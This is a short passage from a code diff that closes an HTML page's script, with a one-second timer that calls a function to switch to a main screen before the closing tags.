+        showScreen('mainScreen');
+      }
+    }, 1000);
+  }
+</script>
+</body>
+</html>
